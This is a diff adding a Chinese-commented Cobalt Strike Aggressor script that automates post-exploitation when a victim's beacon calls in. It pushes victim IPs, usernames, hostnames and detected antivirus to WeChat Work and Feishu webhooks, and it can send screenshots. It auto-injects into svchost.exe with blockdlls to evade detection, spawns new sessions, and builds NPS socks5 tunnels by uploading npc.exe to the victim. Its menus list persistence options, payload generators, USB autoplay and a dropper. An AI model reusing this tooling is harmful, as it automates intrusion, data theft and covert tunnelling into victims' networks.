+		println($cfile, "\$user = \" $+ $3['user'] $+ \";");
+		println($cfile, "\$beacon_repeat = %(internal => \" $+ $3['internal'] $+ \", external => \" $+ $3['external'] $+ \", computer => \" $+ $3['computer'] $+ \", listener => \" $+ $3['listener'] $+ \", user => \" $+ $3['user'] $+ \");");
+		
+		# 关闭文件
+		closef($cfile);
+		
+		# 修改完重新加载一下配置文件
+		include_conf($beacon_repeat_conf);
+	}
+}
+
+# 信标去重对话框
+sub beacon_repeat {
+	# 局部变量
+	local('$defconf $dialog');
+	
+	# 重新加载配置文件
+	include_conf($beacon_repeat_conf);
+	
+	# 默认显示文本
+	$defconf = %(onbre => "true", internal => "true", external => "true", computer => "false", listener => "false", user => "true");
+	
+	# 加载配置文件
+	if ($onbre) {add($defconf, onbre => $onbre);}
+	if ($internal) {add($defconf, internal => $internal);}
+	if ($external) {add($defconf, external => $external);}
+	if ($computer) {add($defconf, computer => $computer);}
+	if ($listener) {add($defconf, listener => $listener);}
+	if ($user) {add($defconf, user => $user);}
+
+	# 创建一个对话框， 对话框的名称
+	$dialog = dialog("信标去重", $defconf, &beacon_repeat_file);
+	
+	# 对话框描述
+	dialog_description($dialog, "对beacon进行查重，重复上线的不进行自动化处理，这对所有自动化操作都起作用,只要任意一个被勾选项有非重复值就会进行处理，");
+
+	# 重复消息检查
+	drow_checkbox($dialog, "onbre", "查重总开关：", iff($onbre eq "true", "已开启", "已关闭"));
+	drow_checkbox($dialog, "internal", "内网 IP：", "");
+	drow_checkbox($dialog, "external", "外网 IP：", "");
+	drow_checkbox($dialog, "computer", "主机名：", "");
+	drow_checkbox($dialog, "listener", "监听器：", "");
+	drow_checkbox($dialog, "user", "用户名：", "");
+
+	# 按钮
+	dbutton_action($dialog, "修改");
+	dbutton_action($dialog, "取消");
+	
+	# 显示对话框
+	dialog_show($dialog);
+}
+
+
+sub auto_qywx_file {
+	# 判断是否修改
+	if ($2 eq '修改') {
+		# 局部变量
+		local('$handle $file');
+		
+		# 配置文件位置 script_resource 函数显示当前路径并拼接传参
+		$file = script_resource("conf/".$auto_qywx);
+		mkdir_conf();
+		# 覆盖模式写入配置文件
+		$cfile = openf("> $+ $file");
+		
+		# 写入
+		println($cfile, "\$onwx = \" $+ $3['onwx'] $+ \";");
+		println($cfile, "\$ts_av = \" $+ $3['ts_av'] $+ \";");
+		println($cfile, "\$is_screenshot = \" $+ $3['is_screenshot'] $+ \";");
+		println($cfile, "\$is_lastf = \" $+ $3['is_lastf'] $+ \";");
+		
+		# 关闭文件
+		closef($cfile);
+		
+		# 修改完重新加载一下配置文件
+		include_conf($auto_qywx);
+	}
+}
+
+# 上线自动推送对话框
+sub auto_qywx {
+	# 局部变量
+	local('$defconf $dialog');
+	
+	# 重新加载配置文件
+	include_conf($auto_qywx);
+
+	# 默认显示文本
+	$defconf = %(onwx => "true");
+	
+	# 加载配置
+	if ($onwx) {add($defconf, onwx => $onwx);}
+	if ($ts_av) {add($defconf, ts_av => $ts_av);}
+	# 是否截图
+	if ($is_screenshot eq "true") {add($defconf, is_screenshot => $is_screenshot);}
+	if ($is_lastf) {add($defconf, is_lastf => $is_lastf);}
+	#println($defconf);
+
+	# 创建一个对话框， 对话框的名称
+	$dialog = dialog("上线信息自动推送到微信", $defconf, &auto_qywx_file);
+	
+	# 对话框描述
+	#dialog_description($dialog, "推送到微信");
+
+	# 文本和按钮对话框
+	drow_checkbox($dialog, "onwx", "推送总开关：", iff($onwx eq "true", "已开启", "已关闭"));
+	drow_checkbox($dialog, "ts_av", "推送杀软信息：", iff($ts_av eq "true", "已开启", "已关闭"));
+	drow_checkbox($dialog, "is_screenshot", "是否发截图：", " 上线成功后发送截图，离开电脑时可以开启，但是行为可被发现");
+	drow_combobox($dialog, "is_lastf", "截图发送方式", @("图片", "图文"));
+
+	# 按钮
+	dbutton_action($dialog, "修改");
+	dbutton_action($dialog, "取消");
+	
+	# 帮助按钮
+	dbutton_help($dialog, "https://work.weixin.qq.com/api/doc/90000/90135/90665");
+	
+	# 显示对话框
+	dialog_show($dialog);
+}
+
+
+# 自动迁移配置文件
+sub auto_migration_file {
+	# 判断是否修改
+	if ($2 eq '修改') {
+		# 局部变量
+		local('$handle $file');
+		
+		# 配置文件位置 script_resource 函数显示当前路径并拼接传参
+		$file = script_resource("conf/".$auto_migration);
+		mkdir_conf();
+		# 覆盖模式写入配置文件
+		$cfile = openf("> $+ $file");
+		
+		# 写入
+		println($cfile, "\$migration = \" $+ $3['migration'] $+ \";");
+		println($cfile, "\$blockdlls = \" $+ $3['blockdlls'] $+ \";");
+		println($cfile, "\$liste1 = \" $+ $3['liste1'] $+ \";");
+		println($cfile, "\$inject = \" $+ $3['inject'] $+ \";");
+		println($cfile, "\$inject_name = \" $+ $3['inject_name'] $+ \";");
+		println($cfile, "\$spawnu = \" $+ $3['spawnu'] $+ \";");
+		println($cfile, "\$spawnux86 = \"".strrep($3['spawnux86'], '\\', '\\\\')."\";");
+		println($cfile, "\$spawnux64 = \"".strrep($3['spawnux64'], '\\', '\\\\')."\";");
+
+		# 关闭文件
+		closef($cfile);
+		
+		# 修改完重新加载一下配置文件
+		include_conf($auto_migration);
+	}
+}
+
+# 上线自动迁移
+sub auto_migration {
+	# 局部变量
+	local('$defconf $dialog');
+	
+	# 重新加载配置文件
+	include_conf($auto_migration);
+	
+	# 默认显示文本
+	$defconf = %(inject_name => "svchost.exe", liste1 => listeners()[0], spawnux86 => "%windir%\\\\explorer.exe",spawnux64 => "%windir%\\\\explorer.exe");
+	
+	# 加载配置
+	if ($migration) {add($defconf, migration => $migration);}
+	if ($blockdlls) {add($defconf, blockdlls => $blockdlls);}
+	if ($liste1) {add($defconf, liste1 => $liste1);}
+	if ($inject) {add($defconf, inject => $inject);}
+	if ($inject_name) {add($defconf, inject_name => $inject_name);}
+	if ($spawnu) {add($defconf, spawnu => $spawnu);}
+	if ($spawnux86) {add($defconf, spawnux86 => $spawnux86);}
+	if ($spawnux64) {add($defconf, spawnux64 => $spawnux64);}
+	#println($defconf);
+
+	# 创建一个对话框， 对话框的名称
+	$dialog = dialog("上线自动迁移", $defconf, &auto_migration_file);
+	
+	# 对话框描述
+	dialog_description($dialog, "上线自动迁移");
+
+	# 文本和按钮对话框
+	drow_checkbox($dialog, "migration", "总开关：", iff($migration eq "true", "已开启", "已关闭"));
+	drow_checkbox($dialog, "blockdlls", "blockdlls：", "禁止非微软证书进程注入");
+	drow_listener($dialog, "liste1", "选择监听器: ");
+	drow_checkbox($dialog, "inject", "自动注入进程：", iff($inject eq "true", "已开启", "已关闭"));
+	drow_text($dialog, "inject_name", "注入的进程名称: ");
+	drow_checkbox($dialog, "spawnu", "自动派生会话：", iff($spawnu eq "true", "已开启", "已关闭"));
+	drow_text($dialog, "spawnux86", "派生后的默认进程x86: ");
+	drow_text($dialog, "spawnux64", "派生后的默认进程x64: ");
+	
+	# 按钮
+	dbutton_action($dialog, "修改");
+	dbutton_action($dialog, "取消");
+	
+	# 显示对话框
+	dialog_show($dialog);	
+}
+
+
+# 自动nps配置文件
+sub auto_nps_file {
+	# 判断是否修改
+	if ($2 eq '修改') {
+		# 局部变量
+		local('$handle $file');
+		
+		# 配置文件位置 script_resource 函数显示当前路径并拼接传参
+		$file = script_resource("conf/".$auto_nps);
+		mkdir_conf();
+		# 覆盖模式写入配置文件
+		$cfile = openf("> $+ $file");
+		
+		# 写入
+		println($cfile, "\$nps_on = \" $+ $3['nps_on'] $+ \";");
+		println($cfile, "\$nps_url = \" $+ $3['nps_url'] $+ \";");
+		println($cfile, "\$nps_auth_key = \" $+ $3['nps_auth_key'] $+ \";");
+		println($cfile, "\$nps_ip = \" $+ $3['nps_ip'] $+ \";");
+		println($cfile, "\$nps_bridge_port = \" $+ $3['nps_bridge_port'] $+ \";");
+		println($cfile, "\$nps_socks_port = \" $+ $3['nps_socks_port'] $+ \";");
+		println($cfile, "\$nps_user = \" $+ $3['nps_user'] $+ \";");
+		println($cfile, "\$nps_passwd = \" $+ $3['nps_passwd'] $+ \";");
+		println($cfile, "\$nps_compress = \" $+ $3['nps_compress'] $+ \";");
+		println($cfile, "\$nps_crypt = \" $+ $3['nps_crypt'] $+ \";");
+		println($cfile, "\$npc_exe = \"".strrep($3['npc_exe'], '\\', '\\\\')."\";");
+
+		# 关闭文件
+		closef($cfile);
+		
+		# 修改完重新加载一下配置文件
+		include_conf($auto_nps);
+	}
+	if ($2 eq "删除没有连接的nps客户端") {
+		prompt_confirm("是否删除没有连接的nps客户端", "删除nps客户端", {nps_del()});
+	}
+}
+
+# 上线自动nps隧道
+sub auto_nps {
+	# 局部变量
+	local('$defconf $dialog');
+	
+	# 重新加载配置文件
+	include_conf($auto_nps);
+	
+	# 默认显示文本
+	$defconf = %(nps_url => "http://192.168.1.1:8080/web_base_url", nps_socks_port => "28560-34079", nps_user => "aaaa", nps_passwd => "aaaa",nps_compress => "true", nps_crypt => "true", npc_exe => script_resource("exe/npc.exe"));
+	
+	# 加载配置
+	if ($nps_on) {add($defconf, nps_on => $nps_on);}
+	if ($nps_url) {add($defconf, nps_url => $nps_url);}
+	if ($nps_auth_key) {add($defconf, nps_auth_key => $nps_auth_key);}
+	if ($nps_ip) {add($defconf, nps_ip => $nps_ip);}
+	if ($nps_bridge_port) {add($defconf, nps_bridge_port => $nps_bridge_port);}
+	if ($nps_socks_port) {add($defconf, nps_socks_port => $nps_socks_port);}
+	if ($nps_user) {add($defconf, nps_user => $nps_user);}
+	if ($nps_passwd) {add($defconf, nps_passwd => $nps_passwd);}
+	if ($nps_compress) {add($defconf, nps_compress => $nps_compress);}
+	if ($nps_crypt) {add($defconf, nps_crypt => $nps_crypt);}
+	if ($npc_exe) {add($defconf, npc_exe => $npc_exe);}
+	#println($defconf);
+	
+	# 创建一个对话框， 对话框的名称
+	$dialog = dialog("上线自动nps隧道", $defconf, &auto_nps_file);
+	
+	# 对话框描述
+	dialog_description($dialog, "上线自动搭建nps隧道，请根据nps.conf填写下面配置，并推送socks5账号密码");
+
+	# 文本和按钮对话框
+	drow_checkbox($dialog, "nps_on", "总开关：", iff($nps_on eq "true", "已开启", "已关闭"));
+	drow_text($dialog, "nps_url", "nps_url: ");
+	drow_text($dialog, "nps_auth_key", "auth_key: ");
+	drow_text($dialog, "nps_ip", "nps_ip: ");
+	drow_text($dialog, "nps_bridge_port", "bridge_port: ");
+	drow_text($dialog, "nps_user", "隧道账号: ");
+	drow_text($dialog, "nps_passwd", "隧道密码: ");
+	drow_text($dialog, "nps_socks_port", "隧道端口范围: ");
+	drow_checkbox($dialog, "nps_compress", "流量压缩：", iff($nps_compress eq "true", "已压缩", "没压缩"));
+	drow_checkbox($dialog, "nps_crypt", "流量加密：", iff($nps_crypt eq "true", "已加密", "没加密"));
+	drow_file($dialog, "npc_exe", "本地npc位置: ");
+	# 按钮
+	dbutton_action($dialog, "删除没有连接的nps客户端");
+	dbutton_action($dialog, "修改");
+	dbutton_action($dialog, "取消");
+	
+	# 显示对话框
+	dialog_show($dialog);	
+}
+
+
+sub feishu_show {
+
+	# 判断是否修改
+	if ($2 eq '修改') {
+		# 局部变量
+		local('$handle $file');
+		
+		# 配置文件位置 script_resource 函数显示当前路径并拼接传参
+		$file = script_resource("conf/".$fswebhook);
+		mkdir_conf();
+		# 覆盖模式写入配置文件
+		$cfile = openf("> $+ $file");
+		
+		# 写入
+		println($cfile, "\$webhook = \" $+ $3['webhook'] $+ \";");
+
+		# 关闭文件
+		closef($cfile);
+		
+		# 修改完重新加载一下配置文件
+		include_conf($fswebhook);
+	}
+	$webhook = $3["webhook"];
+	show_message("您设置的webhook地址是：".$webhook);
+}
+
+# 飞书推送  借鉴Crush.
+sub feishu_conf {
+	# 局部变量   
+	local('$defconf $dialog');
+	
+	# 重新加载配置文件
+	include_conf($fswebhook);
+	$defconf = %(webhook => "");
+	if ($webhook) {add($defconf, webhook => $webhook);}
+	
+	$dialog = dialog("修改飞书机器人推送配置", $defconf, &feishu_show);
+	
+	drow_text($dialog,"webhook","飞书机器人Webhook:"); 
+	dbutton_action($dialog, "修改");
+	dbutton_action($dialog, "取消");
+	dialog_show($dialog);
+}
+
+# 顶部菜单栏添加选项
+menubar("企业微信推送", "qywx");
+
+
+# 添加子菜单
+popup qywx {
+	item("发送测试消息", { test() });
+	item("修改配置文件", { dia_conf() });
+	item("飞书提醒设置", { feishu_conf() });
+	item("打开脚本目录", { exec("explorer.exe ".script_resource()) });
+	separator();
+	menu "上线自动化" {
+		item("信标去重", { beacon_repeat() })
+		item("推送微信", { auto_qywx() });
+		item("进程迁移", { auto_migration() });
+		item("自动NPS", { auto_nps() });
+		separator();
+		menu "自动维权" {
+			item("启动目录", { dia() });
+			item("写注册表", { dia() });
+			item("创建服务", { dia() });
+		}
+	}
+	separator();
+	menu "CS没启用功能" {
+		item("生成有阶段payload&Payload Generator", { openPayloadGeneratorDialog(); });
+		item("生成无阶段Payload Generator (&Stageless)", { openPayloadGeneratorStageDialog(); });
+		item("u盘自动播放&USB/CD AutoPlay", { openAutoRunDialog(); });
+		item("文件捆绑Windows &Dropper", { openWindowsDropperDialog(); });
+	}
+	separator();
+	item("如何获得用户部门标签ID", { url_open("https://work.weixin.qq.com/api/doc/90000/90135/90665"); });
+	item("关于", { url_open("https://github.com/not-know"); });
+}
+
+
+# 发送get请求
+sub http_get {
+	local('$url $handle @content');
+	$url = [new java.net.URL: $1];
+	$handle = [SleepUtils getIOHandle: [$url openStream], $null];
+	@content = readAll($handle);
+	return @content;
+}
+
+
+# 发送post请求
+sub http_post {
+	# 参考
+	# https://forum.90sec.com/t/topic/1620
+	# https://www.cnblogs.com/aeolian/p/7746158.html
+	# https://blog.csdn.net/qq_27870421/article/details/90110773
+	# 对象表达式包含在方括号内。对象表达式的第一个参数是目标。第二个是信息
+	# http://sleep.dashnine.org/manual/hoes.html 
+	
+	local('$url $handle @content $conn $outStream $inStream');
+	$url = [new java.net.URL: $1];
+	# 创建URLConnection实例，用于设置请求参数
+	$conn = [$url openConnection];
+	# 设置请求为post
+	[$conn setRequestMethod: "POST"];
+	# 有请求体，需要将setDoOutput的参数设为true, 默认false
+	[$conn setDoOutput: true];
+	# 设置请求头长度，让服务器知道接受多少字节
+	[$conn setRequestProperty: "Content-Length", strlen($2)];
+	# 设置类型
+	[$conn setRequestProperty: "Content-Type", $3];
+	# 响应写入到此连接的输出流
+	$outStream = [$conn getOutputStream];
+	# 写入请求体
+	[$outStream write: [$2 getBytes]];
+	# sleep 可以将一个任意的InputStream或OutputStream融合到一个I/O句柄中。
+	# http://sleep.dashnine.org/manual/io.html#3
+	$inStream = [$conn getInputStream];
+	$handle = [SleepUtils getIOHandle: $inStream, $outStream];
+	@content = readAll($handle);
+	return @content;
+}
+
+
+# post上传文件
+sub http_post_file {
+	local('$url $handle @content $conn $outStream $inStream');
+	$url = [new java.net.URL: $1];
+	$conn = [$url openConnection];
+	[$conn setRequestMethod: "POST"];
+	[$conn setDoOutput: true];
+	[$conn setRequestProperty: "Content-Length", strlen($2.$3.$4)];
+	[$conn setRequestProperty: "Content-Type", $5];
+	$outStream = [$conn getOutputStream];
+	[$outStream write: [$2 getBytes]];
+	[$outStream write: $3];
+	[$outStream write: [$4 getBytes]];
+	$inStream = [$conn getInputStream];
+	$handle = [SleepUtils getIOHandle: $inStream, $outStream];
+	@content = readAll($handle);
+	return @content;
+}
+
+
+# 获取access_token
+sub get_access_token {
+	local('$result $access_token $data $key $ver $access_token');
+	$url = 'https://qyapi.weixin.qq.com//cgi-bin/gettoken?corpid='.$corpid.'&corpsecret='.$corpsecret;
+	$result = http_get($url)[0];
+	# 去掉开头结尾的花括号
+	$result = substr($result, 1, -1);
+	# 解析json
+	foreach $data (split(",", $result)) {
+		# println($data);
+		($key, $ver) = split(":", $data);
+
+		# 判断是否异常
+		if ($key eq '"errmsg"') {
+			if ($ver ne '"ok"') { 
+				show_error("请检查企业ID和secret是否正确\r\n".$result);  
+				dia_conf();
+			}
+		}
+		
+		# 取出access_token
+		if ($key eq '"access_token"') {
+			$access_token = substr($ver, 1, -1);
+			return $access_token;
+		}
+	}
+}
+
+
+# 飞书推送文本消息
+sub fsend_text {
+	$url = $webhook;
+	# println($webhook);
+	$text = strrep($1, "\r\n", "\\r\\n");
+	#println($text);
+	$json = "{\"msg_type\":\"text\",\"content\":{\"text\": \" $+ $text $+ \" }}";
+	$contype = "application/json";
+	
+	# 发送请求
+	$result = http_post($url, $json, $contype);
+	# println($url."\r\n".$json."\r\n".$result);
+}
+
+
+# 微信推送文本消息
+sub send_text {
+	local('$result $access_token $data $json $contype');
+	fsend_text($1);
+	$access_token = get_access_token();
+	if ($access_token ne "") {
+	
+		$url = "https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=".$access_token;
+		
+		# 请求体
+		$data = "{\"touser\": \"$touser $+ \",";
+		$data = $data."\"toparty\": \"$toparty $+ \",";
+		$data = $data."\"totag\": \"totag $+ \",";
+		$data = $data."\"agentid\": $agentid $+ ,";
+		$data = $data."\"msgtype\": \"text\",";
+		$data = $data."\"text\" : {\"content\" :\"$1 $+ \"},";
+		$data = $data."\"enable_duplicate_check\": $check ,";
+		$json = $data."\"duplicate_check_interval\": $checktime }";
+		
+		# 请求类型
+		$contype = "application/json";
+		
+		# 发送请求
+		$result = http_post($url, $json, $contype);
+		# println($url."\r\n".$json."\r\n".$result);
+	}	
+}
+
+
+# 测试消息
+sub test {
+	prompt_text("发送的文本", "cs上线提醒消息测试", {send_text($1)});
+}
+
+
+# 推送图片
+sub send_image {
+	local('$result $access_token $url $data $json $end $contype $data $key $ver $msgid');
+	# 获取token
+	$access_token = get_access_token();
+	if ($access_token ne "") {
+		$url = 'https://qyapi.weixin.qq.com/cgi-bin/media/upload?access_token='.$access_token.'&type=image&debug=1';
+		# boundary开头、类型、文件名
+		$data = "--74642e7f217528038abc3dbc1061a726\r\n";
+		$data = $data."Content-Disposition: form-data; name=\"media\"; filename=\"a.jpg\"\r\n";
+		$data = $data."Content-Type: image/jpg\r\n\r\n";
+		# boundary结尾
+		$end = "\r\n--74642e7f217528038abc3dbc1061a726--\r\n\r\n";
+		# 请求类型
+		$contype = "multipart/form-data; boundary=74642e7f217528038abc3dbc1061a726";
+		
+		# 上传临时图片
+		$result = http_post_file($url, $data, $1, $end, $contype);
+		#println($url);
+		#println($result);
+		
+		# 去掉开头结尾的花括号
+		$result = substr($result, 1, -1);
+		# 解析json
+		foreach $data (split(",", $result)) {
+			# println($data);
+			($key, $ver) = split(":", $data);
+	
+			# 判断是否异常
+			if ($key eq '"errmsg"') {
+				if ($ver ne '"ok"') { 
+					show_error("上传失败\r\n".$result); 
+				}
+			}
+			
+			# 取出media_id（临时图片的ID）
+			if ($key eq '"media_id"') {
+				$msgid = substr($ver, 1, -1);
+			}
+		}
+		
+		# 推送图片
+		$url = "https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=".$access_token;
+		$data = "{\"touser\": \"$touser $+ \", ";
+		$data = $data."\"toparty\": \"$toparty $+ \", ";
+		$data = $data."\"totag\": \"totag $+ \", ";
+		$data = $data."\"agentid\": $agentid $+ , ";
+		$data = $data."\"msgtype\": \"image\", ";
+		$data = $data."\"image\" : {\"media_id\" :\"$msgid $+ \"}, ";
+		$data = $data."\"enable_duplicate_check\": $check , ";
+		$json = $data."\"duplicate_check_interval\": $checktime }";
+		# 发送请求
+		$result = http_post($url, $json, "application/json");
+		#println($url."\r\n".$json."\r\n".$result);
+
+	}	
+}
+
+
+# 推送图片附带 last
+sub send_image_last {
+	local('$result $access_token $url $data $end $contype $data $key $ver $imgurl $json');
+	# 获取token
+	$access_token = get_access_token();
+	if ($access_token ne "") {
+		$url = 'https://qyapi.weixin.qq.com/cgi-bin/media/uploadimg?access_token='.$access_token.'';
+		# boundary开头、类型、文件名
+		$data = "--74642e7f217528038abc3dbc1061a726\r\n";
+		$data = $data."Content-Disposition: form-data; name=\"fieldNameHere\"; filename=\"a.jpg\"\r\n";
+		$data = $data."Content-Type: image/jpg\r\n\r\n";
+		# boundary结尾
+		$end = "\r\n--74642e7f217528038abc3dbc1061a726--\r\n\r\n";
+		# 请求类型
+		$contype = "multipart/form-data; boundary=74642e7f217528038abc3dbc1061a726";
+		
+		# 上传临时图片
+		$result = http_post_file($url, $data, $2, $end, $contype);
+		#println($url);
+		#println($result);
+		
+		# 去掉开头结尾的花括号
+		$result = substr($result, 1, -3);
+		# 解析json
+		foreach $data (split(",", $result)) {
+			#println($data);
+			($key, $ver) = split('":', $data);
+	
+			# 判断是否异常
+			if ($key eq '"errmsg"') {
+				if ($ver ne '"ok"') { 
+					show_error("上传失败\r\n".$result); 
+				}
+			}
+			
+			# 取出media_id（临时图片的ID）
+			if ($key eq '"url') {
+				$imgurl = substr($ver, 1, -1);
+			}
+		}
+		
+		# 推送图片
+		$url = "https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=".$access_token;
+		$data = "{\"touser\": \"$touser $+ \", ";
+		$data = $data."\"toparty\": \"$toparty $+ \", ";
+		$data = $data."\"totag\": \"totag $+ \", ";
+		$data = $data."\"agentid\": $agentid $+ , ";
+		$data = $data."\"msgtype\": \"news\", ";
+		$data = $data."\"news\" : {\"articles\" : [ {";
+		$data = $data."\"title\": \"last：".beacon_info($1, 'lastf');
+		$data = $data."                                 ".beacon_info($1, 'internal');
+		$data = $data."\", \"description\": \"\",";
+		$data = $data."\"url\": \"".$imgurl."\", \"picurl\": \"".$imgurl;
+		$data = $data."\"]}, ";
+		$data = $data."\"enable_duplicate_check\": $check , ";
+		$json = $data."\"duplicate_check_interval\": $checktime }";
+		# 发送请求
+		$result = http_post($url, $json, "application/json");
+		#println($url."\r\n".$json."\r\n".$result);
+	}	
+}
+
+
+# 判断是否重复
+sub is_repeat {
+
+	#println($2);
+	if($3 eq "false"){return true;}
+	
+	# 局部变量
+	local('$test $test2 $beacon');
+	
+	# 循环对比所有已有beacon  有没有重复的目标	
+	foreach $beacon ($4) {
+		# 不检查自己
+		if ($beacon['id'] == beacon_info($1, "id")) {continue;}
+		
+		$test = "true";
+		$test2 = 0;
+		
+		# 检测是否有一样的值
+		foreach $key ($2) {
+			# 判断是否检查该项
+			if ($2[$key] eq "true") {
+				$test2 = $test2 + 1;
+				if ($beacon[$key] ne beacon_info($1, $key)) {$test = "false";} # 如果有不一样的就跳过
+			}
+		}
+		if (($test eq "true") && ($test2 gt 0)){return false;} # 如果有检查项值全一样的就返回false
+	}
+	return true;
+}
+
+sub wxtuisong {
+	local('$text');
+	# 推送消息的文本
+	$text = "有鱼上钩了，赶紧去看看吧\r\n";
+	$text = $text."\r\n外网地址：".beacon_info($1, 'external');
+	$text = $text."\r\n内网地址：".beacon_info($1, 'internal');
+	$text = $text."\r\n用  户  名：".beacon_info($1, 'user');
+	$text = $text."\r\n进  程  名：".beacon_info($1, 'process');
+	$text = $text."\r\n计算机名：".beacon_info($1, 'computer');
+	
+	# 获得服务器版本
+	$ver = beacon_info($1, 'ver');
+	$ver = iff($ver eq "6.2", "8/10", $ver);
+	$ver = iff($ver eq "6.0", "7/vista", $ver);
+	$ver = iff($ver eq "5.1", "xp/2003", $ver);
+	$ver = iff($ver eq "10.0", "10", $ver);
+	
+	$text = $text."\r\n系统版本：".beacon_info($1, 'os')." ".$ver;
+	$text = $text."\r\n系统位数：".beacon_info($1, 'arch');
+	$text = $text."\r\n\r\nbid：".$1;
+	$text = $text."\r\nteamserver：".localip();
+	
+	if ($ts_av eq "true"){
+		bps($1, lambda({  # 如果没有返回正好证明是不需要提醒的主机
+			local('$name $pid $ppid $arch $session $user $entry $aa @bb $cc @dd');
+			# \n 遍历
+			foreach $entry (split("\n", $2)) {
+				# 用\t来切割并赋值变量
+				($name, $ppid, $pid, $arch, $session, $user) = split("\\t", $entry);
+				foreach $aa ($av) {
+					if(lc($name) eq lc($aa[0])) {if($aa !in @bb) {add(@bb, $aa);}}
+				}
+				foreach $aa ($software) {
+					if(lc($name) eq lc($aa[0])) {if($aa !in @dd) {add(@dd, $aa);}}
+				}
+			}
+			
+			if (@bb ne "@()") {
+				$3 = $3."\r\n\r\n杀软：";
+				foreach $cc (@bb) {
+					$3 = $3."\r\n".$cc[0]."    ".$cc[1];
+				}
+			}
+			if (@bb ne "@()") {
+				$3 = $3."\r\n\r\n重点关注：";
+				foreach $cc (@dd) {
+					$3 = $3."\r\n".$cc[0]."    ".$cc[1];
+				}
+			}
+			send_text($3);
+		}, $3 => $text));
+	} else {send_text($text);}
+	
+	# toast
+	exec(script_resource().'/toast.exe')
+	
+	# 是否截图
+	if ($is_screenshot eq "true") {
+		# 截图
+		binput($1, "screenshot");
+		bscreenshot($1);
+	}
+}
+
+
+# 进程迁移函数
+sub migration_pid {
+	# blockdlls
+	if ($blockdlls eq "true"){
+		binput($1, "blockdlls");
+		blog($1, "blockdlls已开启");
+		bblockdlls($1, true);
+	}
+	
+	bps($1, lambda({
+		local('$name $pid $ppid $arch $session $user $entry');
+		# \n 遍历
+		foreach $entry (split("\n", $2)) {
+			# 用\t来切割并赋值变量
+			($name, $ppid, $pid, $arch, $session, $user) = split("\\t", $entry);
+			if ($name eq $inject_name) {
+				# 判断是否有权限注入
+				if ($session) {
+					# 注入进程，监听用所有监听里的第一个， 最后一个是x86、x64
+					binject($1, $pid, $liste1, $arch);
+					blog($1, "pid：$pid".", 监听：$liste1".", 注入成功");
+					# 有管理员权限的不能派生会话  360会报毒
+					if (!-isadmin $1) {
+						# 派生后的默认临时进程
+						bspawnto($1, "x86", $spawnux86);
+						bspawnto($1, "x64", $spawnux64);
+						# 在这个进程下起一个新的会话
+						bspawnu($1, $pid, $liste1);
+					}
+					break;
+				}
+			}
+		}
+	}));
+}
+	
+	
+# 生成md5
+import java.security.MessageDigest;
+import java.math.BigInteger; 
+sub md5 {
+	local('$m $md5 $md5len');
+	$m = [MessageDigest getInstance: "md5"];
+	[$m update: [$1 getBytes]];
+	$md5 = [[new BigInteger: 1, [$m digest]] toString: 16];
+	$md5len = strlen($md5);
+	for ($x = 0; $x < 32 - $md5len; $x++){$md5 = "0".$md5 ;} # 位数不够开头补0	
+	# println($md5);
+	return $md5;
+}
+
+# 获得nps服务器时间
+sub get_nps_time {
+	local('$url $result $time');
+	$url = $nps_url."/auth/gettime";
+	$result = http_get($url);
+	$result = replace($result[1], " ", ""); # 去除空格
+	$time = split(":", $result)[1];
+	return $time;
+}
+
+# 生成此次请求的auth_key 
+# 每次需要用时间生成key 有效时间20秒
+sub get_nps_auth_key {
+	local('$key $time $auth_key');
+	$time = get_nps_time();
+	$key = $nps_auth_key.$time;
+	$key = md5($key);
+	$auth_key = "auth_key= $+ $key $+ &timestamp= $+ $time $+ &";
+	return $auth_key;
+}
+
+# nps web api 调用
+# https://github.com/ehang-io/nps/wiki/webAPI%E6%96%87%E6%A1%A3
+sub get_nps_web_api {
+	local('$data $contype $url $result');
+	$data = get_nps_auth_key().$1;
+	$contype = "application/x-www-form-urlencoded";
+	$url = $nps_url.$2;
+	$result = http_post($url, $data, $contype);
+	return $result;
+}
+
+# 在nps客户端列表中获得新创建的nps客户端ID和vkey
+sub nps_vkey {
+	local('$result $id $vkey');
+	$result = split("},", $1)[-3];
+	$id = split(",", $result)[1];
+	$id = substr(split(":", $id)[1], 1);
+	
+	$vkey = split(",", $result)[3];
+	$vkey = substr(split(":", $vkey)[1], 2, -1);
+	return @($id, $vkey);
+}
+
+# 确认客户端ID  连接状态
+sub isconnect {
+	local('$result $isconnect $aa $bb');
+	$result = get_nps_web_api('start=0&limit=65535', "/client/list/");
+	$aa = false;
+	foreach $bb ($result) {
+		if (find($bb, '"Id": '.$1)){
+			$aa = true;
+		}
+		if ($aa && find($bb, "IsConnect")) {
+			return substr(split(":", $bb)[1], 1, -1);
+		}
+	}
+}
+
+# 获取可用的端口
+sub nps_socks_port {
+	local('$result @aa $bb $cc');
+	# 获得nps隧道列表
+	$result = get_nps_web_api('&start=0&offset=0&limit=65535&type=socks5&client_id=&search=', "/index/gettunnel/");
+	
+	# 端口列表
+	foreach $bb ($result) {
+		if (find($bb, '"Port":')) {
+			add(@aa, substr(split(":", $bb)[1], 1, -1));
+		}
+	}
+	# 判断端口是否被占用
+	foreach $cc (range($1)) {
+		if ($cc !in @aa) {
+			return $cc;
+		}
+	}
+}
+
+# 删除没有连接的nps客户端
+sub nps_del {
+	local('$result $aa $id $cc');
+	$result = get_nps_web_api('start=0&limit=65535', "/client/list/");
+	foreach $aa ($result) {
+		if (find($aa, '"Id": ')){
+			$id = substr(split(":", $aa)[1], 1, -1);
+		}
+		if (find($aa, "IsConnect")) {
+			$cc = substr(split(":", $aa)[1], 1, -1);
+			if ($cc eq "false") {
+				# 删除客户端
+				get_nps_web_api('id='.$id, "/client/del/");
+			}
+		}
+	}
+}
+
+# 添加nps隧道
+sub nps_start {
+	local('$data $nps_client_add $nps_client_list $nps_port $nps_socks5_add');
+	# 添加nps客户端
+	$data = '&u='.$nps_user.'&p='.$nps_passwd.'&compress='.int($nps_compress).'&crypt='.int($nps_crypt);
+	$nps_client_add = get_nps_web_api($data, "/client/add/");
+	
+	# 获得nps客户端列表
+	$nps_client_list = get_nps_web_api('start=0&limit=65535', "/client/list/");
+	($nps_id, $nps_vkey) = nps_vkey($nps_client_list);
+
+	# 添加socks5隧道
+	$nps_port = nps_socks_port($nps_socks_port);
+	$nps_socks5_add = get_nps_web_api('port='.$nps_port.'&type=socks5&client_id='.$nps_id, "/index/add/");
+	
+	# 判断是否成功添加socks5隧道
+	if (find($nps_socks5_add, "add success")){
+		bcd($1, "c:\\Users\\Public");
+		bupload($1, $npc_exe);
